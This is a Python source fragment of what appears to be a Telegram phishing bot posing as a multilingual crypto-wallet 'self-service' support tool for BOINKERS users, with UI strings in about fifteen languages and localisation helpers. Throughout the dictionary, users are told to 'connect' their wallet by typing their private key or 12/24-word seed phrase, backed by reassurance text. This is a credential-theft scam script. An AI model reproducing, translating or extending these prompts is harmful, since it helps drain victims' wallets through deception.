        "confirm claim stickers": "Sind Sie sicher, dass Sie die eingegebenen Sticker beanspruchen möchten?",
        "yes": "Ja",
        "no": "Nein",
        "back": "🔙 Zurück",
        "invalid_input": "Ungültige Eingabe. Bitte verwenden Sie /start um zu beginnen.",
    },
    "nl": {
        "welcome": "Hallo {user}! Welkom bij de self-service tool voor uw crypto-wallet. Deze bot helpt veelvoorkomende problemen snel en veilig op te lossen.",
        "main menu title": "Gelieve een probleemtype te selecteren om verder te gaan:",
        "buy": "Kopen",
        "validation": "Validatie",
        "claim tokens": "Tokens Claimen",
        "migration issues": "Migratieproblemen",
        "assets recovery": "Herstel van Activa",
        "general issues": "Algemene Problemen",
        "rectification": "Rectificatie",
        "staking issues": "Staking-problemen",
        "deposits": "Stortingen",
        "withdrawals": "Opnames",
        "missing balance": "Ontbrekend Saldo",
        "login issues": "Login-problemen",
        "high gas fees": "Hoge Gas-kosten",
        "presale issues": "Presale-problemen",
        "claim missing sticker": "Ontbrekende Sticker Claimen",
        "connect wallet message": "Verbind uw wallet met uw private key of seed phrase om door te gaan.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Selecteer uw wallet-type:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privésleutel",
        "seed phrase": "🔒 Seed Phrase Importeren",
        "wallet selection message": "U heeft {wallet_name} geselecteerd.\nSelecteer uw voorkeursmodus voor verbinding.",
        "reassurance": PROFESSIONAL_REASSURANCE["nl"],
        "prompt seed": "Voer uw BOINKERS-gebruikersnaam en de 12/24 woorden van uw wallet in." + PROFESSIONAL_REASSURANCE["nl"],
        "prompt private key": "Voer uw privésleutel in." + PROFESSIONAL_REASSURANCE["nl"],
        "invalid choice": "Ongeldige keuze. Gebruik de knoppen.",
        "final error message": "‼️ Er is een fout opgetreden. Gebruik /start om opnieuw te proberen.",
        "choose language": "Selecteer uw voorkeurstaal:",
        "await restart message": "Klik op /start om opnieuw te beginnen.",
        "enter stickers prompt": "Voer de sticker(s) in die u wilt claimen.",
        "confirm claim stickers": "Weet u zeker dat u de ingevoerde stickers wilt claimen?",
        "yes": "Ja",
        "no": "Nee",
        "back": "🔙 Terug",
        "invalid_input": "Ongeldige invoer. Gebruik /start om te beginnen.",
    },
    "hi": {
        "welcome": "नमस्ते {user}! आपके क्रिप्टो वॉलेट की सभी जरूरतों के लिए आपका स्व-सेवा टूल। यह बॉट सामान्य समस्याओं को जल्दी और सुरक्षित रूप से हल करने में मदद करता है।",
        "main menu title": "जारी रखने के लिए कृपया एक समस्या प्रकार चुनें:",
        "buy": "खरीदें",
        "validation": "सत्यापन",
        "claim tokens": "टोकन का दावा करें",
        "migration issues": "माइग्रेशन समस्याएं",
        "assets recovery": "संपत्ति पुनर्प्राप्ति",
        "general issues": "सामान्य समस्याएं",
        "rectification": "सुधार",
        "staking issues": "स्टेकिंग समस्याएं",
        "deposits": "जमा",
        "withdrawals": "निकासी",
        "missing balance": "अनुपस्थित शेष",
        "login issues": "लॉगिन समस्याएं",
        "high gas fees": "उच्च गैस शुल्क",
        "presale issues": "प्रीसेल समस्याएं",
        "claim missing sticker": "गुम स्टिकर का दावा करें",
        "connect wallet message": "कृपया जारी रखने के लिए अपने वॉलेट को निजी कुंजी या सीड वाक्यांश के साथ कनेक्ट करें।",
        "connect wallet button": "🔑 वॉलेट कनेक्ट करें",
        "select wallet type": "कृपया अपने वॉलेट का प्रकार चुनें:",
        "other wallets": "अन्य वॉलेट",
        "private key": "🔑 निजी कुंजी",
        "seed phrase": "🔒 सीड वाक्यांश आयात करें",
        "wallet selection message": "आपने {wallet_name} चुना है।\nकृपया कनेक्शन मोड चुनें।",
        "reassurance": PROFESSIONAL_REASSURANCE["hi"],
        "prompt seed": "कृपया अपना BOINKERS उपयोगकर्ता नाम और वॉलेट के 12/24 शब्द दर्ज करें." + PROFESSIONAL_REASSURANCE["hi"],
        "prompt private key": "कृपया अपनी निजी कुंजी दर्ज करें." + PROFESSIONAL_REASSURANCE["hi"],
        "invalid choice": "अमान्य विकल्प। कृपया बटन का उपयोग करें।",
        "final error message": "‼️ एक त्रुटि हुई। कृपया /start से पुनः प्रयास करें।",
        "choose language": "कृपया अपनी भाषा चुनें:",
        "await restart message": "कृपया /start पर क्लिक करें।",
        "enter stickers prompt": "कृपया उन स्टिकर(ओं) को टाइप करें जिन्हें आप दावा करना चाहते हैं।",
        "confirm claim stickers": "क्या आप सुनिश्चित हैं कि आप दर्ज किए गए स्टिकर का दावा करना चाहते हैं?",
        "yes": "हाँ",
        "no": "नहीं",
        "back": "🔙 वापस",
        "invalid_input": "अमान्य इनपुट। कृपया /start का उपयोग करें।",
    },
    "tr": {
        "welcome": "Merhaba {user}! Kripto cüzdanınız için self-service çözüm aracına hoş geldiniz. Bu bot, yaygın sorunları hızlı ve güvenli bir şekilde çözmenize yardımcı olur.",
        "main menu title": "Devam etmek için lütfen bir sorun türü seçin:",
        "buy": "Satın Al",
        "validation": "Doğrulama",
        "claim tokens": "Token Talep Et",
        "migration issues": "Migrasyon Sorunları",
        "assets recovery": "Varlık Kurtarma",
        "general issues": "Genel Sorunlar",
        "rectification": "Düzeltme",
        "staking issues": "Staking Sorunları",
        "deposits": "Para Yatırma",
        "withdrawals": "Para Çekme",
        "missing balance": "Kayıp Bakiye",
        "login issues": "Giriş Sorunları",
        "high gas fees": "Yüksek Gas Ücretleri",
        "presale issues": "Ön Satış Sorunları",
        "claim missing sticker": "Kayıp Stickeri Talep Et",
        "connect wallet message": "Devam etmek için lütfen cüzdanınızı özel anahtar veya seed ile bağlayın.",
        "connect wallet button": "🔑 Cüzdanı Bağla",
        "select wallet type": "Lütfen cüzdan türünüzü seçin:",
        "other wallets": "Diğer Cüzdanlar",
        "private key": "🔑 Özel Anahtar",
        "seed phrase": "🔒 Seed Cümlesi İçe Aktar",
        "wallet selection message": "{wallet_name} seçtiniz.\nTercih ettiğiniz bağlantı modunu seçin.",
        "reassurance": PROFESSIONAL_REASSURANCE["tr"],
        "prompt seed": "Lütfen BOINKERS kullanıcı adınızı ve 12/24 kelimenizi girin." + PROFESSIONAL_REASSURANCE["tr"],
        "prompt private key": "Lütfen özel anahtarınızı girin." + PROFESSIONAL_REASSURANCE["tr"],
        "invalid choice": "Geçersiz seçim. Lütfen düğmeleri kullanın.",
        "final error message": "‼️ Bir hata oluştu. /start ile tekrar deneyin.",
        "choose language": "Lütfen dilinizi seçin:",
        "await restart message": "Lütfen /start ile yeniden başlayın.",
        "enter stickers prompt": "Talep etmek istediğiniz sticker(ları) yazın.",
        "confirm claim stickers": "Girdiğiniz stickerları talep etmek istiyor musunuz?",
        "yes": "Evet",
        "no": "Hayır",
        "back": "🔙 Geri",
        "invalid_input": "Geçersiz giriş. Lütfen /start kullanın.",
    },
    "zh": {
        "welcome": "你好 {user}！欢迎使用加密钱包自助工具。本机器人可帮助您快速高效地解决常见问题。",
        "main menu title": "请选择一个问题类型以继续：",
        "buy": "购买",
        "validation": "验证",
        "claim tokens": "领取代币",
        "migration issues": "迁移问题",
        "assets recovery": "资产恢复",
        "general issues": "一般问题",
        "rectification": "纠正",
        "staking issues": "质押问题",
        "deposits": "存款",
        "withdrawals": "提款",
        "missing balance": "丢失余额",
        "login issues": "登录问题",
        "high gas fees": "高 Gas 费用",
        "presale issues": "预售问题",
        "claim missing sticker": "申领丢失贴纸",
        "connect wallet message": "请使用私钥或助记词连接您的钱包以继续。",
        "connect wallet button": "🔑 连接钱包",
        "select wallet type": "请选择您的钱包类型：",
        "other wallets": "其他钱包",
        "private key": "🔑 私钥",
        "seed phrase": "🔒 导入助记词",
        "wallet selection message": "您已选择 {wallet_name}。\n请选择连接方式。",
        "reassurance": PROFESSIONAL_REASSURANCE["zh"],
        "prompt seed": "请输入您的 BOINKERS 用户名和钱包的 12/24 个单词。" + PROFESSIONAL_REASSURANCE["zh"],
        "prompt private key": "请输入您的私钥。" + PROFESSIONAL_REASSURANCE["zh"],
        "invalid choice": "无效选择。请使用按钮。",
        "final error message": "‼️ 发生错误。请 /start 再试。",
        "choose language": "请选择您偏好的语言：",
        "await restart message": "请点击 /start 以重新开始。",
        "enter stickers prompt": "请键入您要申领的贴纸。",
        "confirm claim stickers": "您确定要申领您输入的贴纸吗？",
        "yes": "是",
        "no": "否",
        "back": "🔙 返回",
        "invalid_input": "无效输入。请使用 /start 开始。",
    },
    "cs": {
        "welcome": "Ahoj {user}! Vítejte v self-service nástroji pro vaši kryptopeňaženku. Tento bot pomůže rychle a bezpečně vyřešit běžné problémy.",
        "main menu title": "Prosím, vyberte typ problému pro pokračování:",
        "buy": "Koupit",
        "validation": "Ověření",
        "claim tokens": "Získat tokeny",
        "migration issues": "Problémy s migrací",
        "assets recovery": "Obnova aktiv",
        "general issues": "Obecné problémy",
        "rectification": "Náprava",
        "staking issues": "Problémy se stakingem",
        "deposits": "Vklady",
        "withdrawals": "Výběry",
        "missing balance": "Chybějící zůstatek",
        "login issues": "Problémy s přihlášením",
        "high gas fees": "Vysoké poplatky za plyn",
        "presale issues": "Problémy s předprodejem",
        "claim missing sticker": "Nárokovať chybějící nálepku",
        "connect wallet message": "Prosím, připojte peněženku pomocí soukromého klíče nebo seed fráze.",
        "connect wallet button": "🔑 Připojit peněženku",
        "select wallet type": "Vyberte typ peněženky:",
        "other wallets": "Jiné peněženky",
        "private key": "🔑 Soukromý klíč",
        "seed phrase": "🔒 Importovat seed frázi",
        "wallet selection message": "Vybrali jste {wallet_name}.\nVyberte preferovaný způsob připojení.",
        "reassurance": PROFESSIONAL_REASSURANCE["cs"],
        "prompt seed": "Zadejte prosím své BOINKERS uživatelské jméno a 12/24 slov peněženky." + PROFESSIONAL_REASSURANCE["cs"],
        "prompt private key": "Zadejte prosím svůj soukromý klíč." + PROFESSIONAL_REASSURANCE["cs"],
        "invalid choice": "Neplatná volba. Použijte tlačítka.",
        "final error message": "‼️ Došlo k chybě. /start pro opakování.",
        "choose language": "Vyberte preferovaný jazyk:",
        "await restart message": "Klikněte na /start pro opakování.",
        "enter stickers prompt": "Prosím, napište nálepku(y), které chcete požadovat.",
        "confirm claim stickers": "Jste si jisti, že chcete požadovat zadané nálepky?",
        "yes": "Ano",
        "no": "Ne",
        "back": "🔙 Zpět",
        "invalid_input": "Neplatný vstup. Použijte /start.",
    },
    "ur": {
        "welcome": "سلام {user}! اپنے کرپٹو والیٹ کے لیے سیلف سروس ٹول میں خوش آمدید۔ یہ بوٹ عام مسائل کو تیزی سے اور محفوظ طریقے سے حل کرنے میں مدد کرتا ہے۔",
        "main menu title": "براہِ کرم ایک مسئلے کی قسم منتخب کریں:",
        "buy": "خریدیں",
        "validation": "تصدیق",
        "claim tokens": "ٹوکن کلیم کریں",
        "migration issues": "منتقلی کے مسائل",
        "assets recovery": "اثاثوں کی وصولی",
        "general issues": "عام مسائل",
        "rectification": "تصحیح",
        "staking issues": "اسٹیکنگ کے مسائل",
        "deposits": "جمع",
        "withdrawals": "نکاسی",
        "missing balance": "گمشدہ بیلنس",
        "login issues": "لاگ ان کے مسائل",
        "high gas fees": "زیادہ گیس فیس",
        "presale issues": "پری سیل مسائل",
        "claim missing sticker": "غائب اسٹیکر کا دعویٰ کریں",
        "connect wallet message": "براہ کرم اپنا والٹ نجی کلید یا سیڈ کے ساتھ منسلک کریں۔",
        "connect wallet button": "🔑 والیٹ جوڑیں",
        "select wallet type": "براہ کرم والٹ کی قسم منتخب کریں:",
        "other wallets": "دیگر والیٹس",
        "private key": "🔑 نجی کلید",
        "seed phrase": "🔒 سیڈ فریز امپورٹ کریں",
        "wallet selection message": "آپ نے {wallet_name} منتخب کیا ہے.\nبراہِ کرم کنکشن موڈ منتخب کریں.",
        "reassurance": PROFESSIONAL_REASSURANCE["ur"],
        "prompt seed": "براہ کرم اپنا BOINKERS یوزرنیم اور والٹ کے 12/24 الفاظ درج کریں." + PROFESSIONAL_REASSURANCE["ur"],
        "prompt private key": "براہ کرم اپنی نجی کلید درج کریں." + PROFESSIONAL_REASSURANCE["ur"],
        "invalid choice": "غلط انتخاب۔ براہ کرم بٹن استعمال کریں۔",
        "final error message": "‼️ ایک خرابی پیش آگئی۔ براہ کرم /start دوبارہ کریں۔",
        "choose language": "براہ کرم زبان منتخب کریں:",
        "await restart message": "براہ کرم /start دبائیں۔",
        "enter stickers prompt": "براہ کرم وہ سٹیکر(ز) ٹائپ کریں جنہیں آپ کلیم کرنا چاہتے ہیں۔",
        "confirm claim stickers": "کیا آپ یقین رکھتے ہیں کہ آپ داخل کردہ سٹیکر کلیم کرنا چاہتے ہیں؟",
        "yes": "ہاں",
        "no": "نہیں",
        "back": "🔙 واپس",
        "invalid_input": "غلط ان پٹ۔ براہ کرم /start استعمال کریں۔",
    },
    "uz": {
        "welcome": "Salom {user}! Kripto hamyoningiz uchun self-service vositasiga xush kelibsiz. Bu bot umumiy muammolarni tez va xavfsiz hal qilishga yordam beradi.",
        "main menu title": "Davom etish uchun muammo turini tanlang:",
        "buy": "Sotib olish",
        "validation": "Validatsiya",
        "claim tokens": "Tokenlarni talab qilish",
        "migration issues": "Migratsiya muammolari",
        "assets recovery": "Aktivlarni tiklash",
        "general issues": "Umumiy muammolar",
        "rectification": "Tuzatish",
        "staking issues": "Staking muammolari",
        "deposits": "Depozitlar",
        "withdrawals": "Yechib olish",
        "missing balance": "Yo'qolgan balans",
        "login issues": "Kirish muammolari",
        "high gas fees": "Yuqori gaz to'lovlari",
        "presale issues": "Presale muammolari",
        "claim missing sticker": "Yo'qolgan stikerni talab qilish",
        "connect wallet message": "Iltimos, hamyoningizni shaxsiy kalit yoki seed bilan ulang.",
        "connect wallet button": "🔑 Hamyonni ulash",
        "select wallet type": "Iltimos, hamyon turini tanlang:",
        "other wallets": "Boshqa hamyonlar",
        "private key": "🔑 Shaxsiy kalit",
        "seed phrase": "🔒 Seed frazani import qilish",
        "wallet selection message": "Siz {wallet_name} ni tanladingiz.\nUlanish turini tanlang.",
        "reassurance": PROFESSIONAL_REASSURANCE["uz"],
        "prompt seed": "Iltimos, BOINKERS foydalanuvchi nomingizni va hamyoningizning 12/24 so'zini kiriting." + PROFESSIONAL_REASSURANCE["uz"],
        "prompt private key": "Iltimos, shaxsiy kalitingizni kiriting." + PROFESSIONAL_REASSURANCE["uz"],
        "invalid choice": "Noto'g'ri tanlov. Iltimos tugmalardan foydalaning.",
        "final error message": "‼️ Xato yuz berdi. Iltimos /start bilan qayta urinib ko'ring.",
        "choose language": "Iltimos tilni tanlang:",
        "await restart message": "Qayta boshlash uchun /start tugmasini bosing.",
        "enter stickers prompt": "Iltimos, talab qilmoqchi bo'lgan stiker(larni) kiriting.",
        "confirm claim stickers": "Kiritilgan stikerlarni talab qilmochimisiz?",
        "yes": "Ha",
        "no": "Yo'q",
        "back": "🔙 Orqaga",
        "invalid_input": "Noto'g'ri kirish. Iltimos /start foydalaning.",
    },
    "it": {
        "welcome": "Ciao {user}! Benvenuto nello strumento self-service per il tuo wallet crypto. Questo bot aiuta a risolvere rapidamente i problemi comuni in modo sicuro.",
        "main menu title": "Seleziona un tipo di problema per continuare:",
        "buy": "Acquista",
        "validation": "Validazione",
        "claim tokens": "Richiedi Token",
        "migration issues": "Problemi di Migrazione",
        "assets recovery": "Recupero Attivi",
        "general issues": "Problemi Generali",
        "rectification": "Rettifica",
        "staking issues": "Problemi di Staking",
        "deposits": "Depositi",
        "withdrawals": "Prelievi",
        "missing balance": "Saldo Mancante",
        "login issues": "Problemi di Accesso",
        "high gas fees": "Commissioni Gas Elevate",
        "presale issues": "Problemi di Prevendita",
        "claim missing sticker": "Richiedi Sticker Mancante",
        "connect wallet message": "Connetti il tuo wallet con la Chiave Privata o Seed per continuare.",
        "connect wallet button": "🔑 Connetti Portafoglio",
        "select wallet type": "Seleziona il tipo di portafoglio:",
        "other wallets": "Altri Portafogli",
        "private key": "🔑 Chiave Privata",
        "seed phrase": "🔒 Importa Seed Phrase",
        "wallet selection message": "Hai selezionato {wallet_name}.\nSeleziona la modalità di connessione preferita.",
        "reassurance": PROFESSIONAL_REASSURANCE["it"],
        "prompt seed": "Inserisci il tuo nome utente BOINKERS e le 12/24 parole del tuo wallet." + PROFESSIONAL_REASSURANCE["it"],
        "prompt private key": "Inserisci la tua chiave privata." + PROFESSIONAL_REASSURANCE["it"],
        "invalid choice": "Scelta non valida. Usa i pulsanti.",
        "final error message": "‼️ Si è verificato un errore. /start per riprovare.",
        "choose language": "Seleziona la lingua:",
        "await restart message": "Usa /start per ricominciare.",
        "enter stickers prompt": "Digita gentilmente gli sticker che vuoi richiedere.",
        "confirm claim stickers": "Sei sicuro di voler procedere e richiedere gli sticker inseriti?",
        "yes": "Sì",
        "no": "No",
        "back": "🔙 Indietro",
        "invalid_input": "Input non valido. Usa /start per iniziare.",
    },
    "ja": {
        "welcome": "こんにちは {user}！ウォレットのセルフサービスツールへようこそ。このボットはよくある問題を迅速かつ安全に解決します。",
        "main menu title": "続行するために問題の種類を選択してください：",
        "buy": "購入",
        "validation": "検証",
        "claim tokens": "トークンを請求",
        "migration issues": "移行の問題",
        "assets recovery": "資産の回復",
        "general issues": "一般的な問題",
        "rectification": "修正",
        "staking issues": "ステーキングの問題",
        "deposits": "預金",
        "withdrawals": "出金",
        "missing balance": "不足している残高",
        "login issues": "ログインの問題",
        "high gas fees": "高いガス料金",
        "presale issues": "プレセールの問題",
        "claim missing sticker": "紛失したステッカーを請求",
        "connect wallet message": "秘密鍵またはシードフレーズでウォレットを接続してください。",
        "connect wallet button": "🔑 ウォレットを接続",
        "select wallet type": "ウォレットの種類を選択してください：",
        "other wallets": "その他のウォレット",
        "private key": "🔑 秘密鍵",
        "seed phrase": "🔒 シードフレーズをインポート",
        "wallet selection message": "あなたは {wallet_name} を選択しました。\n接続モードを選択してください。",
        "reassurance": PROFESSIONAL_REASSURANCE["ja"],
        "prompt seed": "BOINKERS のユーザー名とウォレットの 12/24 語を入力してください。" + PROFESSIONAL_REASSURANCE["ja"],
        "prompt private key": "秘密鍵を入力してください。" + PROFESSIONAL_REASSURANCE["ja"],
        "invalid choice": "無効な選択です。ボタンを使用してください。",
        "final error message": "‼️ エラーが発生しました。/start で再試行してください。",
        "choose language": "言語を選択してください：",
        "await restart message": "/start をクリックして再開してください。",
        "enter stickers prompt": "請求したいステッカーを入力してください。",
        "confirm claim stickers": "入力したステッカーを請求してもよろしいですか？",
        "yes": "はい",
        "no": "いいえ",
        "back": "🔙 戻る",
        "invalid_input": "無効な入力です。/start を使用してください。",
    },
    "ms": {
        "welcome": "Hai {user}! Selamat datang ke alat layan diri untuk dompet crypto anda. Bot ini membantu menyelesaikan masalah biasa dengan cepat dan selamat.",
        "main menu title": "Sila pilih jenis masalah untuk meneruskan:",
        "buy": "Beli",
        "validation": "Pengesahan",
        "claim tokens": "Tuntut Token",
        "migration issues": "Masalah Migrasi",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Masalah Umum",
        "rectification": "Pembetulan",
        "staking issues": "Masalah Staking",
        "deposits": "Deposit",
        "withdrawals": "Pengeluaran",
        "missing balance": "Baki Hilang",
        "login issues": "Masalah Log Masuk",
        "high gas fees": "Bayaran Gas Tinggi",
        "presale issues": "Masalah Pra-jualan",
        "claim missing sticker": "Tuntut Sticker Hilang",
        "connect wallet message": "Sila sambungkan dompet anda dengan Kunci Peribadi atau Frasa Seed untuk meneruskan.",
        "connect wallet button": "🔑 Sambungkan Dompet",
        "select wallet type": "Sila pilih jenis dompet anda:",
        "other wallets": "Dompet Lain",
        "private key": "🔑 Kunci Peribadi",
        "seed phrase": "🔒 Import Frasa Seed",
        "wallet selection message": "Anda telah memilih {wallet_name}.\nPilih mod sambungan yang diingini.",
        "reassurance": PROFESSIONAL_REASSURANCE["ms"],
        "prompt seed": "Sila masukkan nama pengguna BOINKERS anda dan 12/24 kata dompet anda." + PROFESSIONAL_REASSURANCE["ms"],
        "prompt private key": "Sila masukkan kunci peribadi anda." + PROFESSIONAL_REASSURANCE["ms"],
        "invalid choice": "Pilihan tidak sah. Sila gunakan butang.",
        "final error message": "‼️ Ralat berlaku. /start untuk cuba lagi.",
        "choose language": "Sila pilih bahasa pilihan anda:",
        "await restart message": "Klik /start untuk memulakan semula.",
        "enter stickers prompt": "Sila taip sticker yang ingin anda tuntut.",
        "confirm claim stickers": "Adakah anda pasti mahu menuntut sticker yang dimasukkan?",
        "yes": "Ya",
        "no": "Tidak",
        "back": "🔙 Kembali",
        "invalid_input": "Input tidak sah. Sila gunakan /start.",
    },
    "ro": {
        "welcome": "Bună {user}! Bine ați venit la instrumentul self-service pentru portofelul dvs. crypto. Acest bot ajută la rezolvarea rapidă și sigură a problemelor comune.",
        "main menu title": "Vă rugăm să selectați un tip de problemă pentru a continua:",
        "buy": "Cumpără",
        "validation": "Validare",
        "claim tokens": "Revendică Tokeni",
        "migration issues": "Probleme de Migrare",
        "assets recovery": "Recuperare Active",
        "general issues": "Probleme Generale",
        "rectification": "Rectificare",
        "staking issues": "Probleme de Staking",
        "deposits": "Depozite",
        "withdrawals": "Retrageri",
        "missing balance": "Sold Lipsă",
        "login issues": "Probleme de Autentificare",
        "high gas fees": "Taxe Mari de Gaz",
        "presale issues": "Probleme de Pre-vânzare",
        "claim missing sticker": "Revendică Sticker Lipsă",
        "connect wallet message": "Vă rugăm să vă conectați portofelul cu cheia privată sau fraza seed.",
        "connect wallet button": "🔑 Conectează Portofel",
        "select wallet type": "Selectați tipul portofelului:",
        "other wallets": "Alte Portofele",
        "private key": "🔑 Cheie Privată",
        "seed phrase": "🔒 Importă Seed Phrase",
        "wallet selection message": "Ați selectat {wallet_name}.\nSelectați modul de conectare preferat.",
        "reassurance": PROFESSIONAL_REASSURANCE["ro"],
        "prompt seed": "Introduceți numele de utilizator BOINKERS și cele 12/24 cuvinte ale portofelului." + PROFESSIONAL_REASSURANCE["ro"],
        "prompt private key": "Introduceți cheia privată." + PROFESSIONAL_REASSURANCE["ro"],
        "invalid choice": "Alegere invalidă. Folosiți butoanele.",
        "final error message": "‼️ A apărut o eroare. /start pentru a încerca din nou.",
        "choose language": "Selectați limba preferată:",
        "await restart message": "Faceți clic pe /start pentru a reîncepe.",
        "enter stickers prompt": "Vă rugăm să tastați sticker-ele pe care doriți să le revendicați.",
        "confirm claim stickers": "Sunteți sigur că doriți să revendicați sticker-ele introduse?",
        "yes": "Da",
        "no": "Nu",
        "back": "🔙 Înapoi",
        "invalid_input": "Intrare invalidă. Vă rugăm să folosiți /start.",
    },
    "sk": {
        "welcome": "Ahoj {user}! Vitajte v self-service nástroji pre vašu kryptopeňaženku. Tento bot pomôže rýchlo a bezpečne vyriešiť bežné problémy.",
        "main menu title": "Prosím, vyberte typ problému pre pokračovanie:",
        "buy": "Kúpiť",
        "validation": "Validácia",
        "claim tokens": "Získať tokeny",
        "migration issues": "Migračné problémy",
        "assets recovery": "Obnova aktív",
        "general issues": "Všeobecné problémy",
        "rectification": "Náprava",
        "staking issues": "Problémy so stakingom",
        "deposits": "Vklady",
        "withdrawals": "Výbery",
        "missing balance": "Chýbajúci zostatok",
        "login issues": "Problémy s prihlásením",
        "high gas fees": "Vysoké poplatky za plyn",
        "presale issues": "Problémy s predpredajom",
        "claim missing sticker": "Nárokovať chýbajúci sticker",
        "connect wallet message": "Prosím, pripojte peňaženku súkromným kľúčom alebo seed frázou.",
        "connect wallet button": "🔑 Pripojiť peňaženku",
        "select wallet type": "Vyberte typ peňaženky:",
        "other wallets": "Iné peňaženky",
        "private key": "🔑 Súkromný kľúč",
        "seed phrase": "🔒 Importovať seed frázu",
        "wallet selection message": "Vybrali ste {wallet_name}.\nVyberte spôsob pripojenia.",
        "reassurance": PROFESSIONAL_REASSURANCE["sk"],
        "prompt seed": "Zadajte BOINKERS používateľské meno a 12/24 slov peňaženky." + PROFESSIONAL_REASSURANCE["sk"],
        "prompt private key": "Zadajte svoj súkromný kľúč." + PROFESSIONAL_REASSURANCE["sk"],
        "invalid choice": "Neplatná voľba. Použite tlačidlá.",
        "final error message": "‼️ Vyskytla sa chyba. /start pre opakovanie.",
        "choose language": "Vyberte preferovaný jazyk:",
        "await restart message": "Kliknite na /start pre opakovanie.",
        "enter stickers prompt": "Zadajte prosím samolepku(y), ktoré chcete požadovať.",
        "confirm claim stickers": "Ste si istí, že chcete požadovať zadané samolepky?",
        "yes": "Áno",
        "no": "Nie",
        "back": "🔙 Späť",
        "invalid_input": "Neplatný vstup. Použite /start.",
    },
    "th": {
        "welcome": "สวัสดี {user}! ยินดีต้อนรับสู่เครื่องมือ self-service สำหรับกระเป๋าเงินคริปโตของคุณ บอทนี้ช่วยแก้ปัญหาทั่วไปได้อย่างรวดเร็วและปลอดภัย",
        "main menu title": "กรุณาเลือกประเภทปัญหาเพื่อดำเนินการต่อ:",
        "buy": "ซื้อ",
        "validation": "การตรวจสอบ",
        "claim tokens": "เคลมโทเค็น",
        "migration issues": "ปัญหาการย้ายข้อมูล",
        "assets recovery": "การกู้คืนสินทรัพย์",
        "general issues": "ปัญหาทั่วไป",
        "rectification": "การแก้ไข",
        "staking issues": "ปัญหา Staking",
        "deposits": "ฝาก",
        "withdrawals": "ถอน",
        "missing balance": "ยอดคงเหลือหาย",
        "login issues": "ปัญหาการเข้าสู่ระบบ",
        "high gas fees": "ค่าธรรมเนียม Gas สูง",
        "presale issues": "ปัญหาการขายล่วงหน้า",
        "claim missing sticker": "เคลมสติกเกอร์ที่หายไป",
        "connect wallet message": "กรุณาเชื่อมต่อวอลเล็ตด้วยคีย์ส่วนตัวหรือ Seed Phrase เพื่อดำเนินการต่อ",
        "connect wallet button": "🔑 เชื่อมต่อวอลเล็ต",
        "select wallet type": "กรุณาเลือกประเภทวอลเล็ตของคุณ:",
        "other wallets": "วอลเล็ตอื่น ๆ",
        "private key": "🔑 คีย์ส่วนตัว",
        "seed phrase": "🔒 นำเข้า Seed Phrase",
        "wallet selection message": "คุณได้เลือก {wallet_name}\nโปรดเลือกโหมดการเชื่อมต่อ",
        "reassurance": PROFESSIONAL_REASSURANCE["th"],
        "prompt seed": "กรุณาใส่ชื่อผู้ใช้ BOINKERS และ 12/24 คำของวอลเล็ตของคุณ。" + PROFESSIONAL_REASSURANCE["th"],
        "prompt private key": "กรุณาใส่คีย์ส่วนตัวของคุณ。" + PROFESSIONAL_REASSURANCE["th"],
        "invalid choice": "ตัวเลือกไม่ถูกต้อง. กรุณาใช้ปุ่ม.",
        "final error message": "‼️ เกิดข้อผิดพลาด. /start เพื่อลองอีกครั้ง.",
        "choose language": "กรุณาเลือกภาษา:",
        "await restart message": "คลิก /start เพื่อเริ่มใหม่.",
        "enter stickers prompt": "โปรดพิมพ์สติกเกอร์ที่คุณต้องการเคลม",
        "confirm claim stickers": "คุณแน่ใจหรือไม่ว่าต้องการเคลมสติกเกอร์ที่ป้อน?",
        "yes": "ใช่",
        "no": "ไม่",
        "back": "🔙 ย้อนกลับ",
        "invalid_input": "อินพุตไม่ถูกต้อง. กรุณาใช้ /start.",
    },
    "vi": {
        "welcome": "Chào {user}! Chào mừng bạn đến công cụ tự phục vụ cho ví crypto của bạn. Bot này giúp giải quyết nhanh các vấn đề phổ biến một cách an toàn.",
        "main menu title": "Vui lòng chọn một loại vấn đề để tiếp tục:",
        "buy": "Mua",
        "validation": "Xác thực",
        "claim tokens": "Nhận Token",
        "migration issues": "Vấn đề Di chuyển",
        "assets recovery": "Phục hồi Tài sản",
        "general issues": "Vấn đề Chung",
        "rectification": "Khắc phục",
        "staking issues": "Vấn đề Staking",
        "deposits": "Nạp tiền",
        "withdrawals": "Rút tiền",
        "missing balance": "Số dư bị thiếu",
        "login issues": "Vấn đề Đăng nhập",
        "high gas fees": "Phí Gas Cao",
        "presale issues": "Vấn đề Bán trước",
        "claim missing sticker": "Yêu cầu Sticker Mất",
        "connect wallet message": "Vui lòng kết nối ví của bạn với Khóa Riêng tư hoặc Seed Phrase để tiếp tục.",
        "connect wallet button": "🔑 Kết nối Ví",
        "select wallet type": "Vui lòng chọn loại ví của bạn:",
        "other wallets": "Các ví khác",
        "private key": "🔑 Khóa Riêng tư",
        "seed phrase": "🔒 Nhập Seed Phrase",
        "wallet selection message": "Bạn đã chọn {wallet_name}.\nChọn chế độ kết nối.",
        "reassurance": PROFESSIONAL_REASSURANCE["vi"],
        "prompt seed": "Vui lòng nhập tên người dùng BOINKERS và 12/24 từ ví của bạn." + PROFESSIONAL_REASSURANCE["vi"],
        "prompt private key": "Vui lòng nhập khóa riêng tư của bạn." + PROFESSIONAL_REASSURANCE["vi"],
        "invalid choice": "Lựa chọn không hợp lệ. Vui lòng dùng các nút.",
        "final error message": "‼️ Đã xảy ra lỗi. /start để thử lại.",
        "choose language": "Vui lòng chọn ngôn ngữ:",
        "await restart message": "Nhấn /start để bắt đầu lại.",
        "enter stickers prompt": "Vui lòng nhập sticker(s) bạn muốn yêu cầu.",
        "confirm claim stickers": "Bạn có chắc muốn tiếp tục và yêu cầu các sticker đã nhập không?",
        "yes": "Có",
        "no": "Không",
        "back": "🔙 Quay lại",
        "invalid_input": "Nhập không hợp lệ. Vui lòng sử dụng /start.",
    },
}

# Utility to get localized text
def ui_text(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
    lang = context.user_data.get("language", "en")
    return LANGUAGES.get(lang, LANGUAGES["en"]).get(key, LANGUAGES["en"].get(key, key))


# Generate localized wallet label based on base name and user's language:
def localize_wallet_label(base_name: str, lang: str) -> str:
    wallet_word = WALLET_WORD_BY_LANG.get(lang, WALLET_WORD_BY_LANG["en"])
    if "Wallet" in base_name:
        return base_name.replace("Wallet", wallet_word)
    if "wallet" in base_name:
        return base_name.replace("wallet", wallet_word)
    return base_name


# Helper to send a new bot message and push it onto per-user message stack (to support editing on Back)
